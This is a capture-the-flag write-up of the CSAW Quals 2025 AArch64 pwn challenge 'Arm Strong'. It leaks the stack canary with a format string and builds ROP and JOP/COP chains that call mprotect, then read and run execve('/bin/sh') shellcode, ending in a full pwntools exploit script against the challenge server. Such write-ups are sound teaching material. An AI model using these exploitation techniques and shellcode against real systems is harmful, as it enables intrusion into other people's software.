---
title: Arm Strong - CSAW Quals 2025
authors: Erik Umble (fatbat68), Paul Biernat (bier)
date: 2025-09-24
categories: pwn
---
`Arm Strong` is a pwn challenge from CSAW Quals 2025, which Paul (bier) and Erik (fatbat68) solved together. At the competition end, `Arm Strong` is worth 478 points. 

# Challenge Assesment
We are provided an executable file called `chal` and an entry point on the server which runs `chal`. 

Running `file` on the program, we learn that it is AArch64 and statically linked.
```
chal: ELF 64-bit LSB executable, ARM aarch64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=77d153ea0eb70f23258e01ed998b888cc332521c, for GNU/Linux 3.7.0, not stripped
```
`pwn checksec` gives us information on the mitigations enabled.

<div style="background-color: #000; color: #fff; padding: 10px; font-family: monospace;">
  <table>
    <tr>
      <td style="color: #fff;">Arch:</td>
      <td style="color: #fff;">aarch64-64-little</td>
    </tr>
    <tr>
      <td style="color: #fff;">RELRO:</td>
      <td style="color: #ffc107;">Partial RELRO</td>
    </tr>
    <tr>
      <td style="color: #fff;">Stack:</td>
      <td style="color: #28a745;">Canary found</td>
    </tr>
    <tr>
      <td style="color: #fff;">NX:</td>
      <td style="color: #28a745;">NX enabled</td>
    </tr>
    <tr>
      <td style="color: #fff;">PIE:</td>
      <td style="color: #dc3545;">No PIE (0x400000)</td>
    </tr>
    <tr>
      <td style="color: #fff;">Stripped:</td>
      <td style="color: #dc3545;">No</td>
    </tr>
  </table>
</div>

Next, we open the binary in Ghidra to find the vulnerability.

```c
int main(void) {
    char local_a0 [136];
    long local_18;

    local_18 = 0;
    setvbuf((FILE *)stdin,(char *)0x0,2,0);
    setvbuf((FILE *)stdout,(char *)0x0,2,0);
    setvbuf((FILE *)stderr,(char *)0x0,2,0)
    memset(local_a0, 0, 136)

     puts(
      "[Commander Neil Armstrong]: The Lunar module Eagle has successfully landed at the Sea of Tran quility!"
      );
    read(0,local_a0,0x10);
    printf("[Houston]: ");
    printf(local_a0);
    putchar(10);
    read(0,local_a0,0x888);
    puts("[Commander Neil Armstrong]: That\'s one small step for man, one giant leap for mankind!"); 

    // stack cookie check; Ghidra decompilation is not perfect
    if (local_18 != 0) {
        __stack_chk_fail(&__stack_chk_guard,0,0,local_18);
    }
    return 0;
}
```
## Vulnerabilities
Two vulnerabilities jump out immediately:

1. `printf` with unsanitized user input
```c
read(0,local_a0,0x10);
printf("[Houston]: ");
printf(local_a0);
```

2. stack buffer overflow
```c
char local_a0 [136];
...
read(0,local_a0,0x888);
```

We can use the `printf` vulnerability for [arbitrary stack leaks](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/), and the stack buffer overflow to corrupt `main`'s return address, build a ROP chain, etc.

## Cookie Leak
`printf` supports format specifiers such as `%d` (decimal), `%x` (hex), `%s` (string), `%p` (pointer), etc. each of which take the next input argument and print it out in the specified format. Here is an example:
```c
// outputs: `hello : f`
printf("%s : %x", "hello", 15);
```
It is also possible to specify a different target argument for each specifier:
```c
// outputs: `6, 7, 5`
printf("%2$d, %3$d, %1$d", 5, 6, 7);
```
In AArch64, the first 8 function arguments are passed in the registers `x0` through `x7`; any additional arguments are passed on the stack. This means we can leak values from the stack using `%n%lx` for n >= 8 (using `lx` instead of `x` for 64-bit values). 

Since `main` has 136 + 8 = 144 bytes of local variables, we can leak the stack cookie using `%25$lx` since 
```
(words of local vars) + (skip 7 register arguments) = 144/8 + 7 = 25.
```

The next stack value after the cookie is a saved frame register (`x29`) value, so we'll leak it too using `%26%lx` to get a stack address reference.

Thus we'll start our solve script with
```py
# get cookie and stack leak
p.recvuntil(b'Tranquility!')
p.sendline("%25$p %26$p")
p.recvuntil(b'[Houston]:')

data = p.recvline().strip().decode()
cookie = int(data.split(' ')[0], 16)
stack_addr = int(data.split(' ')[1], 16)
```

# What Didn't Work
As `NX` (Never eXecute writable memory) is enabled, we cannot simply write shellcode to the buffer and return to it. We instead look at the gadgets available to piece together a ROP chain. Since the program is statically compiled, we'll only be able to use gadgets compiled into the binary itself.
```bash
ROPGadget --binary ./chal
```
Although 10242 gadgets show up in the results, we will find a shortage of useful gadgets, and [we'll learn later](#what-we-should-have-done) that we should have allowed deeper gadgets in the search.
## ROP to execve("/bin/sh")
The most straightforward ROP chain usually is to setup a syscall to `execve("/bin/sh")`. For this to happen, we need
```
x0 -> "/bin/sh"
x1 = 0
x2 = 0

x8 = 0xdd // syscall number
```
and then trigger the syscall by jumping to an `svc #0` instruction.

Conveniently, `x1` and `x2` are already 0 at the time `main` returns. And here is an easy gadget for popping a value into `x0` from the stack.
```
0x42aac8: 
    ldr x0, [sp, #0x60] ; 
    ldp x29, x30, [sp], #0x80 ; 
    ret;
```
We wrap this as a 'super gadget' `set_x0` primitive to keep our payload clean.
```py
gadgets = {
    "ldr x0, [sp, #0x60] ; ldp x29, x30, [sp], #0x80 ; ret;": p64(0x42aac8),
    "ldp x29, x30, [sp], #0x10; ret;": p64(0x44b0f0),
}

def set_x0(v0):     
    payload = gadgets["ldr x0, [sp, #0x60] ; ldp x29, x30, [sp], #0x80 ; ret;"]            
    
    payload += b"A"*8 # x29
    payload += gadgets["ldp x29, x30, [sp], #0x10; ret;"] # x30 (leave gadget)
    
    payload += b"A"*(0x60-16) # padding for [sp, #0x60]
    payload += p64(v0) # x0 

    payload += b"A"*(0x20) # padding for leave gadget
    return payload 
```

But we cannot find a suitable gadget for setting `x8` to 0xdd.
We can load an arbitrary value into `x8` with this gadget:
```
0x440200 : 
    ldp x8, x9, [sp], #0xd0 ; 
    ldp x17, x30, [sp], #0x10 ; 
    br x16
```
but this requires control over `x16` first, which is not possible with the gadgets in our list.

Another idea we pursue is to increment `x8` repeatedly using this gadget:
```
0x417ce0 : 
    add x8, x8, #1 ; 
    cmp x1, x8 ; b.ne #0x417d08 ; 
    ldr x1, [x2] ; 
    strb wzr, [x7] ; 
    add x1, x1, #1 ; 
    str x1, [x2] ; 
    str x1, [x0, #0x498] ; 
    ldp x29, x30, [sp], #0x10 ; 
    ret
```
but this requires `x7` to hold a writable address, and we cannot find a ROP gadget for setting `x7` to an arbitrary value. 
## _dl_make_stacks_executable
Instead of using ROP to `execv("/bin/sh")`, another option is to set the executable permission on the stack and then jump to our shellcode on it. We find the `_dl_make_stacks_executable` function present, which wraps `mprotect` and seems suitable for this task based on [a prevous CTF writeup](https://radareorg.github.io/blog/posts/defeating-baby_rop-with-radare2/).

`_dl_make_stacks_executable` is an attractive function because it wraps `mprotect` and only requires us to control `x0` when calling it. This is simpler than `mprotect`'s `x0`, `x1`, and `x2`. So ideally we could just pass our desired stack address, the memory page would become `RWX`, and we would jump to shellcode. Unfortunately it wasn't that simple.

Although this would be an incredibly convenient function, there is an issue that prevented us from using it. Let's examine the first call to `mprotect` in `_dl_make_stacks_executable`:
```
iVar2 = mprotect((void *)(*param_1 & -_dl_pagesize),_dl_pagesize,__stack_prot);
```
for reference, this is the `mprotect` function signature:
```
int mprotect(void *__addr, size_t __len, int __prot)
```
So, `__stack_prot` (a global variable) has to be set to our desired permissions (RWX). This can be done by setting `__stack_prot` to `0x7` (`PROT_READ | PROT_WRITE | PROT_EXEC`). But, without getting into too much detail, this variable is initialized on program startup and its value is determined by the mitigations enforced onto the binary. In this case, because `NX` is enabled, `__stack_prot` is set to `0x01` (`PROT_READ`).

This means we'll have to overwrite the `__stack_prot` value via a ROP chain, which technically isn't an issue. We can chain together some gadgets to overwrite a global variable with relative ease. However, when we tried to implement this, we consistently got a Segmentation Fault when trying to overwrite it. A quick glance at Ghidra's memory map view shows us the problem:

`__stack_prot @ 0x48fb08`

`0x48c2d0 -- 0x48fc17 : R`

Our global variable resides in read-only memory! So we can't modify it unless we first change the permissions using `mprotect`. This, of course, was the original goal of calling this function, so at this point we decided we would just call `mprotect` "from scratch" in hopes of ultimately jumping to shellcode.

## mprotect
Instead of `_dl_make_stacks_executable`, we can try calling `mprotect` directly.

In AArch64, the `ret` intruction itself does not pop from the stack. Instead, it is equivalent to branching to the link register `bx lr` (`bx x30`). 

Oftentimes, a function needs to call other functions and overwrite the link register in the process, so it saves `lr` to the stack and pops it before returning. But in functions that do not make calls (leaf functions), compiler optimization avoids saving the return address to the stack. Leaf functions are incompatible with ROP chains, since they do not return to a value from the stack.

Since `mprotect` is a leaf function, we cannot just use ROP if we want to use it.
### JOP/COP Dispatcher


AArch64 is notorious for not having great ROP gadgets available (and sometimes including mitigations that prevent ROP altogether). We can leverage Jump Oriented Programming (JOP) and Call Oriented Programming (COP) gadgets to make up for the lack in ROP gadgets. Similar to ROP gadgets, a JOP or COP gadget performs a small task and ends with a jump or call to a register value, respectively (instead of returning to the next address popped from the stack).

A useful paradigm for JOP/COP is the dispatcher gadget + gadget table approach. Consider this gadget we find available:
```
0x400284:
    ldr x17, [x16, #8] ; 
    add x16, x16, #8 ; 
    br x17
```
This loads an address pointed to by `x16`, increments `x16`, and then jumps to the loaded address. This is an example of a JOP dispatcher. Suppose we point `x16` to an array of gadget addresses (gadget table), and set any other register (such as `x0`) to the address of the dispatcher (`0x400284`). Then, we can create a nearly arbitrary chain of JOP gadgets that end in `bx x0` and the dispatcher will iterate over them, executing each, one after the other. 

The issue with the above dispatcher is that it requires control over `x16`, which we've already discovered to be infeasible. 

We find a different dispatcher gadget (from `call_init`) that seems much nicer:
```
    LAB_0044cd60  
0044cd60 add        x19 ,x19 ,#0x8
    LAB_0044cd64  
0044cd64 ldr        x3,[x0]
0044cd68 mov        x2,x22
0044cd6c mov        w0,w20
0044cd70 mov        x1,x21
0044cd74 blr        x3
0044cd78 mov        x0,x19
0044cd7c cmp        x19 ,x23
0044cd80 b.ne       LAB_0044cd60
```
This looks more complicated, so let's unpack it.

1. `x0` points to a value which is loaded into `x3` and called with `blr x3`
1. `x0`, `x1`, and `x2` are set to `w20`, `x21`, and `x22`, respectively
1. `x0` gets incremented by 8 (via `x19`) after the call returns
1. repeat until `x19 = x23`

To use this, we'll need to set `x0 = x19 = <gadget table address>`; set `x20`, `x21`, and `x22`; and jump to this dispatcher.

The main catch with this gadget - **spoiler alert** - is that it sets `w0` instead of `x0`, meaning the upper 32 bits of the `x0` register will be set to 0 before the call.

The nice thing about this gadget is that because it uses a call `blr x3` and loops, we can use this to call leaf functions and other non-ROP gadgets just as easily as ROP gadgets. 

We also can control the function arguments by first setting up `w20`, `x21`, and `x22` using this gadget that Adam (SickIGN) found:
```
0x415358:
    ldp x19, x20, [sp, #0x10] ; 
    ldp x21, x22, [sp, #0x20] ; 
    ldp x23, x24, [sp, #0x30] ; 
    ldr x25, [sp, #0x40] ; 
    ldp x29, x30, [sp], #0x50 ; 
    ret;
```
We package this as a 'super gadget' too.
```py
def set_regs(v19, v20, v21, v22, v23, v24, v25):
    payload = gadgets["ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldr x25, [sp, #0x40] ; ldp x29, x30, [sp], #0x50 ; ret;"]
    payload += b"A"*8 # fr padding
    payload += gadgets["ldp x29, x30, [sp], #0x10; ret;"] #x30 (leave gadget)
    payload += p64(v19) #x19
    payload += p64(v20) #x20
    payload += p64(v21) #x21
    payload += p64(v22) #x22
    payload += p64(v23) #x23
    payload += p64(v24) #x24
    payload += p64(v25) #x25

    payload += b"B"*0x8 #fr padding

    payload += b"C"*0x8 #leave fr padding
    return payload

def setup_dispatcher(gadget_table_addr, arg0, arg1, arg2):
    return set_regs(gadget_table_addr, arg0, arg1, arg2, 0xDEADBEEF, 0, 0)
```
### mprotect(stack)
Using the above dispatcher, we add execute permission to the stack with a call to `mprotect` and jump to our shellcode.

And it works... locally. But not remotely.

The issue is that the stack address does not fit in the 32 bits of `w0`.
After a while of debugging, we realize that NX is not being enforced on our local qemu emulated program. So the shellcode is executing even though `mprotect` is failing. 

We pivot one more time to an approach that finally worked.

# Our Solution
Instead of setting the execute permission on the stack, why not set the write permission on program memory and write our shellcode there. Since PIE is disabled, the program memory starts at 0x400000 and can easily fit in `w0`. 

We find an unused function at 0x42b4d0 which we choose to overwrite.

Strategy:

1. mprotect(0x42b000, 0x1000, 0b111)
1. read(0, 0x42b4d0, len(shellcode))
1. Jump to 0x42b4d0

Putting this all together, we obtain the following script, which finally works remotely as well as locally.

```py
from pwn import *

p = remote('chals.ctf.csaw.io', 21003)
#p = process('qemu-aarch64 -L /usr/aarch64-linux-gnu ./chal'.split())

# https://www.exploit-db.com/exploits/47048
shellcode = (
    b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
    b"\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
    b"\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"
)

mprotect_addr = 0x416a00
read_addr = 0x00415c90
prog_addr =  0x42b4d0

gadgets = {
    "ldp x29, x30, [sp], #0x10; ret;": p64(0x44b0f0),
    "dispatcher_ret_addr": p64(0x44cd78),
    "ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldr x25, [sp, #0x40] ; ldp x29, x30, [sp], #0x50 ; ret;": p64(0x415358),
    "ldr x0, [sp, #0x60] ; ldp x29, x30, [sp], #0x80 ; ret;": p64(0x42aac8),
}

def set_x0(v0):     
    payload = gadgets["ldr x0, [sp, #0x60] ; ldp x29, x30, [sp], #0x80 ; ret;"]            
    
    payload += b"A"*8 # x29
    payload += gadgets["ldp x29, x30, [sp], #0x10; ret;"] # x30 (leave gadget)
    
    payload += b"A"*(0x60-16) # padding for [sp, #0x60]
    payload += p64(v0) # x0 

    payload += b"A"*(0x20) # padding for leave gadget
    return payload 

def set_regs(v19, v20, v21, v22, v23, v24, v25):
    payload = gadgets["ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldr x25, [sp, #0x40] ; ldp x29, x30, [sp], #0x50 ; ret;"]
    payload += b"A"*8 # fr padding
    payload += gadgets["ldp x29, x30, [sp], #0x10; ret;"] #x30 (leave gadget)
    payload += p64(v19) #x19
    payload += p64(v20) #x20
    payload += p64(v21) #x21
    payload += p64(v22) #x22
    payload += p64(v23) #x23
    payload += p64(v24) #x24
    payload += p64(v25) #x25

    payload += b"B"*0x8 #fr padding

    payload += b"C"*0x8 #leave fr padding
    return payload

def setup_dispatcher(gadget_table_addr, arg0, arg1, arg2):
    return set_regs(gadget_table_addr, arg0, arg1, arg2, 0xDEADBEEF, 0, 0)


##
# Cookie and Stack leak
##
p.recvuntil(b'Tranquility!')
p.sendline("%25$p %26$p")
p.recvuntil(b'[Houston]:')

data = p.recvline().strip().decode()
cookie = int(data.split(' ')[0], 16)
stack_addr = int(data.split(' ')[1], 16)
print(f"COOKIE {hex(cookie)}")
print(f"STACK {hex(stack_addr)}")

payload_start_addr = stack_addr - 0xa0
gadget_table_addr = payload_start_addr + 0x400
shellcode_addr = gadget_table_addr + 0x10

# #
# Payload
# #
payload = b""
payload = b"A"*(136-len(payload))
payload += p64(cookie)
payload += b"B"*8 #padding

# setup mprotect() args
payload += setup_dispatcher(gadget_table_addr, prog_addr & ~0xFFF, 0x1000, 0b111)
payload += set_x0(gadget_table_addr)
payload += gadgets["ldr x3, [x0]; mov x2, x22; mov w0, w20; mov x1, x21; blr x3;"]

# setup read() args
# clip the first word since we get to the adam gadget via dispatcher call instead of ROP
payload += setup_dispatcher(gadget_table_addr + 0x10, 0, prog_addr, len(shellcode) + 1)[0x8:]  
# set gadget return to where the dispatcher expects
payload += gadgets["dispatcher_ret_addr"]


payload += b'A'*(0x400 - len(payload))  # padding to expected gadget table address

dispatcher_gadget_table = (
    p64(mprotect_addr)
    + gadgets["ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldr x25, [sp, #0x40] ; ldp x29, x30, [sp], #0x50 ; ret;"]
    + p64(read_addr)
    + p64(prog_addr)
)
payload += dispatcher_gadget_table

p.sendline(payload)
p.sendline(shellcode)
p.interactive()
```
# What We Should Have Done
After the competiton ended, we read various writeups / solve scripts to see how other teams approached `Arm Strong`. We realized that the binary contains a very powerful gadget from `_dl_runtime_resolve` which we missed because it is too large for the default depth setting of `ROPGadget`:

```
0x4401dc (_dl_runtime_resolve + 72) : 
    mov x16, x0 ; 
    ldp q0, q1, [sp, #0x50] ; 
    ldp q2, q3, [sp, #0x70] ; 
    ldp q4, q5, [sp, #0x90] ; 
    ldp q6, q7, [sp, #0xb0] ; 
    ldp x0, x1, [sp, #0x40] ; 
    ldp x2, x3, [sp, #0x30] ; 
    ldp x4, x5, [sp, #0x20] ; 
    ldp x6, x7, [sp, #0x10] ; 
    ldp x8, x9, [sp], #0xd0 ; 
    ldp x17, x30, [sp], #0x10 ; 
    br x16
```
We could have set `x0` to point to an `svc #0` instruction, and set up registers for `execve("/bin/sh")` from the stack with this 'goat gadget'. 

The default depth for `ROPGadget` is 10; this gadget first shows up with a depth of 13 specified.

```bash
ROPgadget --depth 13 --binary ./chal | grep -E "mov x16, x0.*br x16"
```

Lesson learned: if we are having trouble finding useful gadgets, maybe we just need to include larger gadgets in our search.
